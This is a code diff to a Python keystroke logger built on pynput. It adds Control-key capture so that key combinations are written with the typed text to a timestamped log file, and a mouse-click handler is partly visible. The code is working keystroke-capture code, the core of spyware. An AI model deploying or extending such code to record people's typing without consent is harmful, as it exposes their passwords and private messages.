@@ -8,15 +8,17 @@ keys = ""
 shiftOn = False
 capsOn = False
 capsDown = False
+controlDown = False
 
 def on_press(key):
-    global keys, shiftOn, capsOn, capsDown
+
+    global keys, shiftOn, capsOn, capsDown, controlDown
     #If we get a caps lock, then set that to true
     if key == keyboard.Key.caps_lock:
         if not capsDown:
             #toggle
             capsOn = not capsOn
-        capsDown = True;
+        capsDown = True
     
     #If we get a shift code, then toggle it on
     if key == keyboard.Key.shift:
@@ -30,11 +32,22 @@ def on_press(key):
     if key == keyboard.Key.backspace:
         if(len(keys) > 0):
             keys = keys[:-1]
+
+    #If we hit control we want to output CTRL + Key
+    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
+        controlDown = True
         
     #Only add in the characters
     if(len(str(key)) == 3):
+        if(controlDown):
+            #Push the current keys into the file
+            write_file(keys)
+            keys = ""
+            controlString = "<CTRL> + " + str(key)[1]
+            write_file(controlString)
+            
         #caps lock
-        if(capsOn):  
+        elif(capsOn):  
             if(shiftOn):
                 keys = keys + str(key)[1]
             else:
@@ -94,13 +107,16 @@ def write_file(keys):
             f.write(str(timeStamp) + ": " + keys + "\n");
             
 def on_release(key):
-    global shiftOn, capsDown
+    global shiftOn, capsDown, controlDown
     if key == keyboard.Key.shift:
         shiftOn = False
     if key == keyboard.Key.caps_lock:
         capsDown = False
+    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
+        controlDown = False      
     if key == keyboard.Key.esc:
         return False
+
 
 def on_click(x, y, button, pressed):
     global keys
